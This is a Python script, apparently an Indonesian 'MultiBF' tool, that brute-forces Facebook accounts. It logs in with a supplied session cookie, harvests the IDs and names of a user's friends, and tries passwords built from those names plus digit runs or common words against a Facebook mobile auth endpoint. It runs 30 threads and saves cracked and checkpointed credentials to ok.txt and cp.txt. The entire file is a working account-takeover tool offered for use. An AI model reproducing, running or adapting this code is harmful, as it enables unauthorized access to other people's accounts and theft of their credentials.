# coding=utf-8
# Coded By DulLah

class Brute(object):
	def __init__(self):
		self.id = []
		self.session = requests.session()
		self.url = "https://mbasic.facebook.com{0}"
		self.loop = 0
		self.cekpoin = []
		self.ok = []
	
	def init(self, cookie):
		data = {}
		hd = {
		"User-Agent" : "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
		"Cookie" : str(cookie)}
		cookies = {
		"Cookie " : str(cookie)}
		data["ua"] = hd
		data["cookie"] = cookies
		return data
	
	def logo(self, x, bottom):
		logo = ("""
  \033[1;96m __  ___     ____  _   ___  ____
  /  |/  /_ __/ / /_(_) / _ )/ __/ \033[0m|| Created By DulLah\033[1;96m
 / /|_/ / // / / __/ / / _  / _/   \033[0m|| Github.com/dz-id\033[1;96m
/_/  /_/\_,_/_/\__/_/ /____/_/\033[0m     || FB.me/dulahz
________________________________________________________

%s%s """%(x.upper(), bottom))
		return logo
	
	def login(self):
		print(self.logo("",""))
		print("\033[1;96mLogin with your facebook cookies first\n")
		cookie = str(raw_input("\033[1;96m[*] \033[0mCookie : "))
		self.data = self.init(cookie)
		
		content = self.session.request(
			"GET", "https://mbasic.facebook.com/profile.php",
				headers = self.data["ua"], cookies = self.data["cookie"]
		).text
		if ("logout.php" in str(content.encode("utf-8"))):
			main.comments(self, self.data["ua"], self.data["cookie"])
			main.bahasa(self, self.data["ua"], self.data["cookie"])
			open("cookie.log", "w").write(cookie.encode("utf-8"))
			self.main()
		else:
			print("\033[1;91m[*] \033[0mWrong cookies")
			time.sleep(2)
			self.login()
			exit()
		
	def main(self):
		try:
			cookie = open("cookie.log").read()
			self.data = self.init(cookie)
			
			content = self.session.request(
				"GET", "https://mbasic.facebook.com/profile.php",
					headers = self.data["ua"], cookies = self.data["cookie"]
			).text
			bs = BeautifulSoup(content, "html.parser")
			if ("logout.php" in str(bs)):
				print(self.logo("user : "+bs.title.text, "\n________________________________________________________"))
				self.menu()
			else:
				os.remove("cookie.log")
				self.login()
		except IOError:
			self.login()
	
	def menu(self):
		print("""
\033[1;96m(•) \033[0m01. Friends Lists
\033[1;96m(•) \033[0m02. Friends
\033[1;96m(•) \033[0m00. Remove Cookie\n""")
		choice = int(raw_input("\033[1;96m[*] \033[0mEnter your choice >> "))
		if (choice == 1):
			print("")
			self.type = 1
			url = self.url.format("/friends/center/friends/")
			self.grabId(url)
		elif (choice == 2):
			print("\n\033[1;91m(?) Note : use mbasic")
			url = raw_input("\n\033[1;96m[*]\033[0m Enter friends lists url : ")
			self.type = 2
			self.grabId(url)
		elif (choice == 0):
			os.remove("cookie.log")
			self.login()
		else:
			exit("\n\033[1;91m[!] \033[0mLiat menu dong.")
			
	def grabId(self, url):
		content = self.session.request(
			"GET", url,
				headers = self.data["ua"], cookies = self.data["cookie"]
		).text
		bs = BeautifulSoup(content, "html.parser")
		if (self.type == 1):
			for x in bs.findAll(style="vertical-align: middle"):
				find = x.find("a")
				if "None" in str(find) or "+" in str(find):
					continue
				else:
					id = re.findall("/?uid=(.*?)&", find["href"])
					ids = id[0]+"_"+find.text.replace(" ", "_")
					self.id.append(ids)
					
				sys.stdout.write(
					"\r\033[1;96m[*] \033[0m[\033[1;91m{0}\033[0m] {1} Getting id ".format(
						len(self.id), id[0]
				)) ; sys.stdout.flush()
		else:
			for x in bs.findAll(style="vertical-align: middle"):
				find = x.find("a")
				if "None" in str(find) or "+" in str(find):
					continue
				else:
					if ('/profile.php?id=' in str(find)):
						id = re.findall("/?id=(.*?)&",find["href"])
						ids = id[0]+"_"+find.text.replace(" ", "_")
						self.id.append(ids)
					else:
						id = re.findall("/(.*?)\?fref=",find["href"])
						ids = id[0]+"_"+find.text.replace(" ", "_")
						self.id.append(ids)
						
				sys.stdout.write(
					"\r\033[1;96m[*] \033[0m[\033[1;91m{0}\033[0m] Getting id ".format(
						len(self.id), id[0]
				)) ; sys.stdout.flush()
			
		if ("Lihat selengkapnya" in str(bs)):
			next = bs.find("a", string="Lihat selengkapnya")["href"]
			self.grabId(self.url.format(next))
		elif ("Lihat Teman Lain" in str(bs)):
			next = bs.find("a", string="Lihat Teman Lain")["href"]
			self.grabId(self.url.format(next))
		else:
			print("")
			ThreadPool(30).map(self.crack, self.id)
			self.results(self.ok, self.cekpoin)
			exit()
	
	def users(self, user):
		users = user.split("_")
		if (len(users) == 2):
			pasw = [
				users[1]+"123",
				users[1]+"1234",
			]
		elif (len(users) == 3):
			pasw = [
				users[1]+"123",
				users[1]+"1234",
				users[2]+"123",
				users[2]+"1234",
				users[3]+"1234",
				users[3]+"12345",
				users[4]+"12345",
				users[4]+"123456",
				users[5]+"123456",
				users[5]+"1234567",
				users[6]+"1234567",
				users[6]+"12345678",
				users[7]+"123456789",
				users[7]+"1234567890",
			
			]
		elif (len(users) == 4):
			pasw = [
				users[1]+"123",
				users[1]+"1234",
				users[2]+"123",
				users[2]+"1234",
				users[3]+"123",
				users[3]+"1234",
			]
		else:
			pasw = [
				'sayang', 'sayangku',
				'ILOVEYOU','ILoveYou',
				'iloveyou', 'cintaku',
				'munafik', 'mylove',
				'mylove123', 'cintaku',
			]
		return pasw
	
	def results(self, ok, cp):
		if (len(ok) !=0):
			print("\n\n\033[1;96m[*] \033[0mFound : %s"%(len(ok)))
			for x in ok: print("\033[1;92m"+x)
			print("\033[1;96m[*] \033[0mSaved : ok.txt")
		if (len(cp) !=0):
			print("\n\n\033[1;96m[*] \033[0mCekpoint : %s"%(len(cp)))
			for x in cp: print("\033[1;93m"+x)
			print("\033[1;96m[*] \033[0mSaved : cp.txt")
		if (len(ok) == 0 and len(cp) == 0):
			print("\n\n\033[1;91m[!] \033[0mNo results Found :(")
			
	def crack(self, user):
		try:
			self.loop+=1
			pw = self.users(user)
			for i in pw:
				username = user.split("_")[0].lower()
				password = i.lower()
				url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+username+"&locale=en_US&password="+password+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
				req = requests.request(
					"GET", url
				).json()
				try:
					if "www.facebook.com" in req["error_msg"]:
						self.cekpoin.append(username+"|"+password)
						open("cp.txt","a").write(str(username)+"|"+str(password)+"\n")
						break
				except:
					try:
						req["access_token"]
						self.ok.append(username+"|"+password)
						open("ok.txt","a").write(str(username)+"|"+str(password)+"\n")
						break
					except: pass
			
			sys.stdout.write(
				"\r\033[1;96m[*] \033[0mCracking %s/%s Ok:-%s Cp:-%s "%(
					self.loop, len(self.id), len(self.ok), len(self.cekpoin)
				)
			) ; sys.stdout.flush()
		except: pass

try:
	import requests, os, re, time, sys, hashlib
	from data import main
	from bs4 import BeautifulSoup
	from multiprocessing.pool import ThreadPool
	Brute().main()
except Exception as E:
	exit("\n\033[1;91m[*] \033[0mError : "+str(E))
